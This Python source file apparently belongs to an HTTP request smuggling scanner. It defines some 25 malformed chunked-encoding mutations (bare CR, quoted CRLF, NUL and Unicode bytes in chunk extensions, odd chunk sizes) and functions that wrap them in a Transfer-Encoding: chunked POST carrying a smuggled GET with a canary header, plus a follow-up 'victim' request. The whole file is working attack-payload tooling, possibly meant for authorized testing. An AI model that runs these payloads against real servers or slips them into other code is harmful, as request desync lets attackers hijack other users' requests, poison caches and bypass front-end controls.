from typing import Dict


def funky_chunk_mutations() -> Dict[str, str]:
    return {
        "quoted_crlf": '1;a="\r\nX\r\n0\r\n\r\n',
        "quoted_crlf_escaped": '1;a="\\\r\nX\r\n0\r\n\r\n',
        "unquoted_semicolon": '1;ext=val\r\nX\r\n0\r\n\r\n',
        "quoted_semicolon": '1;a="val;more"\r\nX\r\n0\r\n\r\n',
        "quoted_lf": '1;a="\nX\r\n0\r\n\r\n',
        "quoted_cr_only": '1;a="\rX\r\n0\r\n\r\n',
        "nested_quotes": '1;a="val\\"inner"\r\nX\r\n0\r\n\r\n',
        "empty_quoted": '1;a=""\r\nX\r\n0\r\n\r\n',
        "chunk_ext_space": '1 ;a=b\r\nX\r\n0\r\n\r\n',
        "chunk_ext_tab": '1\t;a=b\r\nX\r\n0\r\n\r\n',
        "chunk_size_plus": '+1\r\nX\r\n0\r\n\r\n',
        "chunk_size_leading_zero": '01\r\nX\r\n0\r\n\r\n',
        "chunk_size_trailing_space": '1 \r\nX\r\n0\r\n\r\n',
        "chunk_size_trailing_tab": '1\t\r\nX\r\n0\r\n\r\n',
        "quoted_backslash": '1;a="\\"\r\nX\r\n0\r\n\r\n',
        "multiple_extensions": '1;a=b;c=d;e=f\r\nX\r\n0\r\n\r\n',
        "quoted_with_obs_text": '1;a="\x80"\r\nX\r\n0\r\n\r\n',
        "empty_chunk_ext": '1;\r\nX\r\n0\r\n\r\n',
        "bare_cr_in_size": '0\rX\r\n0\r\n\r\n',
        "lone_lf_in_ext": '1;a="\n"\r\nX\r\n0\r\n\r\n',
        "oversized_chunk_term": '1\r\nX\r\n' + 'A' * 256 + '\r\n0\r\n\r\n',
        "chunk_ext_crlf_inside": '1;a="\r\nB"\r\nX\r\n0\r\n\r\n',
        "chunk_ext_quoted_backslash_cr": '1;a="\\\r"\r\nX\r\n0\r\n\r\n',
        "chunk_ext_null": '1;a="\x00"\r\nX\r\n0\r\n\r\n',
        "chunk_ext_unicode_kelvin": '1;a="\u212a"\r\nX\r\n0\r\n\r\n',
    }


def build_funky_smuggled(host_header: str, canary_path: str) -> str:
    return (
        f"GET {canary_path} HTTP/1.1\r\n"
        f"Host: {host_header}\r\n"
        f"X-FunkyCanary: true\r\n"
        f"\r\n"
    )


def build_funky_victim(endpoint: str, host_header: str) -> bytes:
    return (
        f"GET {endpoint}?victim=1 HTTP/1.1\r\n"
        f"Host: {host_header}\r\n"
        f"\r\n"
    ).encode("latin-1")


def build_funky_prefix(mutation: str, endpoint: str, host_header: str) -> bytes:
    payload = (
        f"POST {endpoint} HTTP/1.1\r\n"
        f"Host: {host_header}\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"\r\n"
        f"{mutation}"
    )
    return payload.encode("latin-1", errors="replace")


def build_funky_payload(mutation: str, endpoint: str, host_header: str,
                        canary_path: str) -> bytes:
    smuggled = build_funky_smuggled(host_header, canary_path)
    payload = (
        f"POST {endpoint} HTTP/1.1\r\n"
        f"Host: {host_header}\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"\r\n"
        f"{mutation}"
        f"{smuggled}"
    )
    return payload.encode("latin-1", errors="replace")
